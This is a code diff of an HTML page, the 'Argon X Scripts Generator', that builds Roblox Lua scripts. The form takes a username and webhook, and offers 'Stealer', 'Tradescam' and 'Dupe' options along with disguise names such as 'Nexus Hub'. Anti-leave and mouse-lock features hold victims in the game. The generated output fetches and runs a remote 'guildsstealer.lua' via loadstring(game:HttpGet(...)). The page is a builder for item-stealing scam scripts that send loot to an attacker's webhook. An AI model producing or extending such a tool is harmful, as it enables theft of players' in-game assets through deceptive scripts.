@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Argon X Scripts - Ps99</title>
+  <title>Argon X Scripts - Gui</title>
   <style>
     body {
         font-family: Arial, sans-serif;
@@ -27,7 +27,7 @@
     form {
         margin: 20px 0;
     }
-    input, textarea {
+    input, textarea, select {
         display: block;
         width: calc(100% - 22px);
         margin: 10px auto;
@@ -50,31 +50,6 @@
     button:hover {
         background-color: #0056b3;
     }
-    #status {
-        margin-top: 20px;
-        font-size: 16px;
-    }
-    #pastelist {
-        margin-top: 20px;
-        text-align: left;
-        max-width: 600px;
-        margin-left: auto;
-        margin-right: auto;
-    }
-    #pastelist ul {
-        list-style-type: none;
-        padding: 0;
-    }
-    #pastelist li {
-        margin-bottom: 10px;
-    }
-    #pastelist a {
-        color: #007bff;
-        text-decoration: none;
-    }
-    #pastelist a:hover {
-        text-decoration: underline;
-    }
   </style>
 </head>
 <body>
@@ -82,29 +57,60 @@
     <h1>Argon X Scripts Generator!</h1>
     <form id="scriptForm">
       <label for="username">Username:</label>
-      <input type="text" id="username" name="username"><br><br>
+      <input type="text" id="username" name="username" required><br><br>
 
-      <label for="webhook">Webhook URL:</label>
-      <input type="text" id="webhook" name="webhook"><br><br>
+      <label for="webhook">Webhook URL (must be a valid URL):</label>
+      <input type="url" id="webhook" name="webhook" required><br><br>
 
-      <label for="minimumRAP">Minimum RAP:</label>
-      <input type="number" id="minimumRAP" name="minimumRAP"><br><br>
+      <label for="minimumRap">Minimum RAP:</label>
+      <input type="number" id="minimumRap" name="minimumRap" required><br><br>
 
-      <label for="mailMessage">Mail Message:</label>
-      <input type="text" id="mailMessage" name="mailMessage"><br><br>
+      <label for="mouseLock">Mouse Lock:</label>
+      <select id="mouseLock" name="mouseLock">
+        <option value="true">True</option>
+        <option value="false">False</option>
+      </select><br><br>
 
-      <label for="mouseLock">Enable Mouse Lock:</label>
-      <input type="checkbox" id="mouseLock" name="mouseLock"><br><br>
+      <label for="antileave">Antileave:</label>
+      <select id="antileave" name="antileave">
+        <option value="true">True</option>
+        <option value="false">False</option>
+      </select><br><br>
 
-      <label for="antileave">Enable Anti-leave:</label>
-      <input type="checkbox" id="antileave" name="antileave"><br><br>
+      <label for="loadingscreen">Loading Screen:</label>
+      <select id="loadingscreen" name="loadingscreen">
+        <option value="true">True</option>
+        <option value="false">False</option>
+      </select><br><br>
 
-      <label for="loadingscreen">Show Loading Screen:</label>
-      <input type="checkbox" id="loadingscreen" name="loadingscreen"><br><br>
+      <label for="typesui">Types UI:</label>
+      <select id="typesui" name="typesui">
+        <option value="kavo">Kavo</option>
+        <option value="orion">Orion</option>
+        <option value="fluent">Fluent</option>
+      </select><br><br>
+
+      <label for="typescript">Type Script:</label>
+      <select id="typescript" name="typescript">
+        <option value="dupe">Dupe</option>
+        <option value="tradescam">Tradescam</option>
+      </select><br><br>
+
+      <label for="scriptname">Script Name:</label>
+      <select id="scriptname" name="scriptname">
+        <option value="Nexus Hub">Nexus Hub</option>
+        <option value="Eclipse Hub">Eclipse Hub</option>
+        <option value="Clever Hub">Clever Hub</option>
+      </select><br><br>
+
+      <label for="stealer">Stealer:</label>
+      <select id="stealer" name="stealer">
+        <option value="ps99">Ps99</option>
+        <!-- More options can be added as needed -->
+      </select><br><br>
 
       <button type="button" id="generateBtn">Generate</button>
-      <textarea id="output" readonly></textarea><br><br>
-
+      <textarea id="output" readonly placeholder="Generated script will appear here"></textarea><br><br>
       <button type="button" id="copyBtn">Copy to Clipboard</button>
     </form>
   </div>
@@ -113,35 +119,48 @@
     document.addEventListener("DOMContentLoaded", function() {
       const generateButton = document.getElementById('generateBtn');
       const copyButton = document.getElementById('copyBtn');
-      
+
       generateButton.addEventListener('click', function(event) {
-        event.preventDefault(); 
+        event.preventDefault();
 
         const username = document.getElementById("username").value;
         const webhook = document.getElementById("webhook").value;
-        const minimumRAP = document.getElementById("minimumRAP").value;
-        const mailMessage = document.getElementById("mailMessage").value;
-        const mouseLock = document.getElementById("mouseLock").checked;
-        const antileave = document.getElementById("antileave").checked;
-        const loadingscreen = document.getElementById("loadingscreen").checked;
+        const minimumRap = document.getElementById("minimumRap").value;
+        const mouseLock = document.getElementById("mouseLock").value;
+        const antileave = document.getElementById("antileave").value;
+        const loadingscreen = document.getElementById("loadingscreen").value;
+        const typesui = document.getElementById("typesui").value;
+        const typescript = document.getElementById("typescript").value;
+        const scriptname = document.getElementById("scriptname").value;
+        const stealer = document.getElementById("stealer").value;
 
-        if (!username || !webhook || !minimumRAP || !mailMessage) {
-          alert("Please fill in all fields.");
+        // Validate webhook URL
+        const urlPattern = new RegExp('^(https?:\\/\\/)?'+ // protocol
+          '((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.?)+[a-z]{2,}|'+ // domain name
+          '((\\d{1,3}\\.){3}\\d{1,3}))'+ // OR ip (v4) address
+          '(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*'+ // port and path
+          '(\\?[;&a-z\\d%_.~+=-]*)?'+ // query string
+          '(\\#[-a-z\\d_]*)?$','i'); // fragment locator
+
+        if (!urlPattern.test(webhook)) {
+          alert("Please enter a valid Webhook URL.");
           return;
         }
 
-        const outputString = `--generate through website\n` +
-                             `--website made by kizamies#0001/Shimm\n` +
+        const outputString = `-- Generated via Argon X Scripts Generator\n` +
                              `config = {\n` +
                              `    Username = "${username}",\n` +
                              `    Webhook = "${webhook}",\n` +
-                             `    MinimumRAP = "${minimumRAP}",\n` +
+                             `    MinimumRap = "${minimumRap}",\n` +
                              `    mouseLock = ${mouseLock},\n` +
                              `    antileave = ${antileave},\n` +
                              `    loadingscreen = ${loadingscreen},\n` +
-                             `    MailMessage = "${mailMessage}",\n` +
+                             `    typesui = "${typesui}",\n` +
+                             `    typescript = "${typescript}",\n` +
+                             `    scriptname = "${scriptname}",\n` +
+                             `    stealer = "${stealer}",\n` +
                              `}\n\n` +
-                             'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Script-Ps99/main/lds.lua",true))()';
+                             'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/gui-stealer/main/guildsstealer.lua", true))()';
 
         document.getElementById("output").value = outputString;
       });
@@ -149,7 +168,6 @@
       copyButton.addEventListener('click', function() {
         const copyText = document.getElementById("output");
         copyText.select();
-        copyText.setSelectionRange(0, 99999);
         document.execCommand("copy");
         alert("Copied to clipboard!");
       });
